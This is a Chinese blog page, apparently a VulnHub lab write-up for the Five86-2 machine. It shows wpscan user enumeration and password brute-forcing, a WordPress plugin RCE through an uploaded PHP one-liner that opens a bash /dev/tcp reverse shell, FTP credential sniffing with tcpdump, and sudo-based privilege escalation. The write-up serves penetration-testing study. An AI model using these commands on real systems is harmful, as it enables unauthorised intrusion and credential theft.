@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[vulnhub]Five86-2靶机 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[vulnhub]Five86-2靶机</h2>
+            <div class="post-date">2020-02-05</div>
+            
+            <div class="post-content">
+              <p>开放了20,21,80端口<br>
+<img src="https://guokeya.github.io/post-images/1580876964974.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>proftpd1.3.5有个远程代码执行。然而这里是1.3.5e<br>
+尝试匿名登陆。不行<br>
+继续看80端口<br>
+是个wordpress<br>
+wpscan先获取下用户名<br>
+<code>wpscan --url http://192.168.0.183/ -e u</code><br>
+然后爆破用户名密码<br>
+<code>wpscan --url http://192.168.0.183/ -U /root/user.txt -P /usr/share/wordlists//rockyou.txt</code><br>
+得到两个用户名密码<br>
+<img src="https://guokeya.github.io/post-images/1580877082307.png" alt="" loading="lazy"><br>
+登陆后台。有三个插件<br>
+<img src="https://guokeya.github.io/post-images/1580877142874.png" alt="" loading="lazy"><br>
+第三个插件存在RCE<br>
+利用：<code>https://www.freebuf.com/vuls/205735.html</code><br>
+新建一个index.html和123.php<br>
+123.php是一句话木马<code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.183/8080 0&gt;&amp;1'&quot;);?&gt;</code><br>
+打包poc.zip<br>
+<img src="https://guokeya.github.io/post-images/1580877823514.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580877859002.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580877864346.png" alt="" loading="lazy"><br>
+<code>http://five86-2/wp-content/uploads/articulate_uploads/poc/123.php</code><br>
+查看进程。发现有个paul用户有个脚本跑ftp。看名字应该是自动上传。<br>
+<img src="https://guokeya.github.io/post-images/1580878048649.png" alt="" loading="lazy"><br>
+自动上传。就会有登陆FTP。用户名密码<br>
+尝试抓包。www用户没权限调用tcpdump<br>
+前面爆出两个用户名密码。尝试登陆下<br>
+PS:这里PHP反弹的shell就可以su。一句话木马的shell就不能，<br>
+<code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code><br>
+tcpdump -D发现有多张网卡<br>
+<img src="https://guokeya.github.io/post-images/1580879487455.png" alt="" loading="lazy"><br>
+监听用户名密码<br>
+<img src="https://guokeya.github.io/post-images/1580880875800.png" alt="" loading="lazy"><br>
+可以以peter用户执行server</p>
+<pre><code>paul@five86-2:/tmp$ sudo -l
+sudo -l
+Matching Defaults entries for paul on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User paul may run the following commands on five86-2:
+    (peter) NOPASSWD: /usr/sbin/service
+</code></pre>
+<p>sudo -u peter service /bin/bash</p>
+<pre><code>peter@five86-2:/$ sudo -l
+sudo -l
+Matching Defaults entries for peter on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User peter may run the following commands on five86-2:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/passwd
+peter@five86-2:/$ 
+</code></pre>
+<p>直接passwd改密码<br>
+<img src="https://guokeya.github.io/post-images/1580881367945.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/vulnhubfive86-1-ba-ji/">
+                  <h3 class="post-title">
+                    [vulnhub]Five86-1靶机
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
